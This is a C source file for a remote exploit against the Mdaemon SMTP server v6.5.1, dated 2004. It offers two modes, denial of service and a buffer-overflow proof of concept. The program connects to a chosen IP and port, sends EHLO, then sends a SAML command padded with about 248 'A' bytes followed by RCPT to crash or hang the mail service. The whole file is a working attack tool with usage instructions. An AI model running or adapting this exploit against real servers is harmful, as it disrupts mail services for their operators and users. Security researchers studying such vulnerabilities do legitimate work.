/////////////////////////////////////////////////////////////
//        Remote DoS and proof-of-concept exploit          //
//                         for               		   //
//               Mdaemon smtp server v6.5.1                //
//	                   and                             //
//                possible other version.                  //
//                   Find bug: D_BuG.        		   //
//                    Author: D_BuG.                       //
//                     D_BuG@bk.ru            		   //                
//                   Data: 16/09/2004        		   //
//                     NOT PUBLIC!                         //
//		      Greets:Rasco.                        // 
/////////////////////////////////////////////////////////////

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int     sock,err;
struct  sockaddr_in sa;


int main (int argc, char *argv[])
	
	{
	
	printf("Remote DoS and proof-of-concept(buffer overflow) exploit\n");
	printf("                         for                              \n");
	printf("Mdaemon smtp server v6.5.1 and possible other version.\n");                    
	if(argc!=4)
	{
	printf("Usage: %s <IPADDRESS> <PORT> <TARGET>\n",argv[0]);
	printf("Target:\n1.DoS.\n2.Proof-of-concept(buffer overflow).\n");
	printf("e.g.:%s 192.168.1.1 25 1\n",argv[0]);
	exit(-1);
	}


     	sa.sin_family=AF_INET;
	sa.sin_port=htons(atoi(argv[2]));
	if(inet_pton(AF_INET, argv[1], &sa.sin_addr) <= 0)
	printf("Error inet_pton\n");
		
	sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	
	printf("[~]Connecting...\n");
	
	if(connect(sock,(struct sockaddr *)&sa,sizeof(sa)) <0)
	{
	printf("[-]Connect filed....\nExit...\n");
	exit(-1);
	}

int len=247;
	
if(atoi(argv[3])==2)
{
len++;
}
	
char szBuffer[len+7];
char buff[len];
char send[]="EHLO tester\n";
char send3[]="RCPT TO postmaster\n";
char rcv[1024];
int i;
for(i=0;i<len;i++)
    {
    buff[i]=0x41;
    }
    
sprintf(szBuffer,"SAML %s\n",buff);

		printf("[+]Ok!\n");
		sleep(2);
		printf("[~]Get banner...\n");
		if(read(sock,&rcv,sizeof(rcv)) !=-1){}
		    
		if(strstr(rcv,"220")==NULL)
		{
		printf("[-]Failed!\n");
		}
		else
		{ 
		printf("[+]Ok!\n");
    		}
								 
		printf("[~]Send EHLO...\n");
		write(sock,send,sizeof(send)-1);
		sleep(2);
		memset(rcv,0,1024);
		if(read(sock,&rcv,sizeof(rcv)) !=-1){}
		
		if(strstr(rcv,"250")==NULL)
		{
		printf("[-]Failed...\n");
		}
		else
		{
		printf("[+]Ok!\n");
		}
		printf("[~]Send SAML...\n");
		write(sock,szBuffer,strlen(szBuffer));//Send SAML
		sleep(2);
		memset(rcv,0,1024);
		if(read(sock,&rcv,sizeof(rcv)) !=-1){}
		
		if(strstr(rcv,"250")==NULL)
		{
		printf("[-]Exploit failed...please check your version Mdaemon!\n");
		printf("[-]Exit...\n");
		exit(-1);
		}
		printf("[+]Ok!\n");
		
		printf("[~]Send RCPT...\n\n");
		write(sock,send3,sizeof(send3)-1);//Send RCPT
		sleep(2);
		if(atoi(argv[3])==2)
		{
		printf("[+]Crash service.....\n");
		}
		else
		{
		printf("[+]DoS service.....\n");
		}
		printf("[~]Done.\n");
		
		close(sock);
		
return 0;

}
